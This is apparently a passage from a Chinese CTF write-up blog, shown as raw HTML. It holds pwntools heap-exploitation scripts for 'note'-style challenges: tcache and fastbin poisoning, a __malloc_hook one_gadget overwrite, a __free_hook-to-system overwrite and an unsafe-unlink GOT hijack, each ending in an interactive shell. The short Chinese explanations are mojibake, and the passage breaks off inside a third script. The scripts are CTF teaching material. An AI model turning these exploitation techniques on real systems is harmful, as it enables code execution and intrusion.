dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">rs</span><span class="token punctuation">(</span>arg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> p
    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token string">'remote'</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>host<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> binary<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>arg<span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span>
binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./note'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
ld   <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'index?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'size?\n>> '</span> <span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'content?\n>> '</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'index?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'index?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'index?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 0x7f7d4047cca0 (main_arena+96)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token string">b'aaa'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token string">b'aaa'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token string">b'aaa'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token string">b'tcache'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token operator">*</span><span class="token string">b'X'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

<span class="token comment"># åˆ†å‰² unsorted bin</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'pad'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'pad'</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
__malloc_hook <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x10</span>
leak<span class="token punctuation">(</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">,</span> __malloc_hook<span class="token punctuation">)</span>
lbase <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
lsys <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
__free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>lsys<span class="token punctuation">)</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>

irt<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="elder-note"><a href="#elder-note" class="headerlink" title="elder_note"></a>elder_note</h2><p>libc-2.23.so</p>
<p>fastbin attackï¼Œfastbin çš„æ ¡éªŒä¸å¤§ä¸¥æ ¼ï¼Œå¯ä»¥ UAF</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">rs</span><span class="token punctuation">(</span>arg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> p
    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token string">'remote'</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>host<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> binary<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>arg<span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span>
binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./note'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
ld   <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'unsorted_bin'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'protected_bin'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
__malloc_hook <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> <span class="token number">16</span>
leak<span class="token punctuation">(</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">,</span> __malloc_hook<span class="token punctuation">)</span>
lbase <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
lsystem <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
realloc <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>
gadget <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x4525a</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment"># å¤ä½</span>

<span class="token comment"># fastbin attack</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'fastbin'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x68</span> <span class="token punctuation">,</span> <span class="token string">b'guard'</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment"># Arbitrary Alloc </span>
add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook <span class="token operator">-</span> <span class="token number">0x1b</span> <span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">,</span> __malloc_hook<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> lsystem<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x13</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>realloc<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span><span class="token string">b'test'</span><span class="token punctuation">)</span>

irt<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="changeable-note"><a href="#changeable-note" class="headerlink" title="changeable_note"></a>changeable_note</h2><p>libc-2.31.so ä¿æŠ¤æ²¡å¼€å¥½ï¼ŒRELRO ï¼Œå¯ä»¥åŠ«æŒ GOT è¡¨ï¼Œè€Œä¸” PIE ä¹Ÿæ²¡æœ‰å¼€ï¼Œå¦‚æœå¼€äº†ï¼ˆå°±ä¸çŸ¥é“æ€ä¹ˆæ‰“äº†ã€‚è¿™é¢˜çš„çŸ¥è¯†ç‚¹ä¸»è¦æ˜¯ unsorted bin unlinkï¼Œåé¢æˆ‘è¿˜ç”¨åˆ°äº† off by Xï¼Œåˆå¹¶äº†å†æ³„éœ²ï¼Œä½†æ˜¯å…¶å®æ²¡ä»€ä¹ˆå¿…è¦ï¼Œå› ä¸ºä¸€æ¬¡ unlink å¯ä»¥è¦†ç›–å¾ˆå¤šæŒ‡é’ˆã€‚</p>
<p>è¿™é‡Œæˆ‘åˆ©ç”¨ how2heap ä¸­çš„ unsafe_unlink æŠŠåŸç†ç”»ä¸€ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220407135121252.png" alt="image-20220407135121252"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
